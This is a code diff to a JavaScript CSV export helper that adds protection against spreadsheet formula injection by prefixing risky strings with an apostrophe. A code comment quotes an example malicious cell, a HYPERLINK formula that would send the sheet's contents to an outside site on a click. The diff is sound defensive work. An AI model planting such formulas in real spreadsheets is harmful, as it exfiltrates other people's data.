@@ -15,7 +15,14 @@ function cell(value) {
   if (value == null) return ''
   // A jsonb value can itself be an object or array; JSON is a far more useful
   // cell than the "[object Object]" that String() would produce.
-  const s = typeof value === 'object' ? JSON.stringify(value) : String(value)
+  let s = typeof value === 'object' ? JSON.stringify(value) : String(value)
+  // Formula injection. Excel and Sheets execute a cell that starts with = + - @
+  // (or a tab/CR before one), and these files carry free text any member typed
+  // — scouting notes, pick-list notes, TBA nicknames — opened by a lead. A note
+  // reading =HYPERLINK("https://…?"&A2,"x") would ship the sheet's contents
+  // off-site on a click. A leading apostrophe makes the spreadsheet show the
+  // text as text. Only strings: a real number like -3 must stay a number.
+  if (typeof value === 'string' && /^[=+\-@\t\r]/.test(s)) s = `'${s}`
   return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
 }
 
